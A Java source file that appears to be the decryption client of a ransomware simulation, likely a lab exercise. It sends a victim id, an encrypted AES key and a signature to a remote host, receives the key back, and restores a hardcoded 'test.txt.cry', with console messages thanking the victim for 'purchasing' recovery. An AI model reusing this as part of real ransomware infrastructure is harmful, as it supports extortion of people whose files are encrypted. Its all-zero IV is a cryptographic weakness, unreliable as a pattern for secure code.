import java.io.*;
import java.security.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import java.nio.file.*;
import java.security.spec.*;
import java.net.*;

public class Decryptor {
    public static void main(String[] args) throws Exception {
        String host = args[0];
        int port = Integer.parseInt(args[1]);
        String userid = args[2];

        System.out.println("Dear customer, thank you for purchasing this software.");
        System.out.println("We are here to help you recover your files from this horrible attack.");
        System.out.println("Trying to decrypt files...");


        Path aesKeyPath = Paths.get("aes.key");

        KeyFactory kf = KeyFactory.getInstance("RSA");

        // Read private key
        FileInputStream privKeyFile = new FileInputStream(userid + ".prv");
        byte [] privKeyBytes = privKeyFile.readAllBytes();
        PrivateKey privKey = kf.generatePrivate(new PKCS8EncodedKeySpec(privKeyBytes));
        privKeyFile.close();

        byte[] useridBytes = userid.getBytes();
        byte[] aeskeyBytes = Files.readAllBytes(aesKeyPath);

        // Create rsa signature and sign with private key
        Signature rsaSignature = Signature.getInstance("SHA256withRSA");
        rsaSignature.initSign(privKey);

        rsaSignature.update(useridBytes);
        rsaSignature.update(aeskeyBytes);

        byte[] signature = rsaSignature.sign();

        try (Socket socket = new Socket(host, port);
             DataOutputStream dout = new DataOutputStream(socket.getOutputStream());
             DataInputStream din = new DataInputStream(socket.getInputStream())) {

            // Passing length for easy prefixing for our bytes
            dout.writeInt(useridBytes.length);
            dout.write(useridBytes);

            dout.writeInt(aeskeyBytes.length);
            dout.write(aeskeyBytes);

            dout.writeInt(signature.length);
            dout.write(signature);

            // If signature is verified
            if (din.readBoolean()) {
                // Reform the original AES key
                int decryptedAesLength = din.readInt();
                byte[] decryptedAesBytes = new byte[decryptedAesLength];
                din.readFully(decryptedAesBytes);
                SecretKeySpec originalAesKey = new SecretKeySpec(decryptedAesBytes, "AES");
                byte[] iv = new byte[16];
                IvParameterSpec ivSpec = new IvParameterSpec(iv);

                Cipher aesCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                aesCipher.init(Cipher.DECRYPT_MODE, originalAesKey, ivSpec);

                // Decrypting .cry file back to original
                try (FileInputStream fileIn = new FileInputStream("test.txt.cry")) {
                    byte[] encryptedText = fileIn.readAllBytes();
                    fileIn.close();

                    byte[] decryptedText = aesCipher.doFinal(encryptedText);

                    Files.write(Paths.get("test.txt"), decryptedText);

                    Files.delete(Paths.get("test.txt.cry"));
                    Files.delete(aesKeyPath);

                    System.out.println("Success! your files have now been recovered!");
                }

            // If signature not verified
            } else {
                System.out.println("Unfortunately we cannot verify your identity.");
                System.out.println("Please try again, making sure that you have the correct signature");
                System.out.println("key in place and have entered the correct userid.");
            }
        }
    }
}
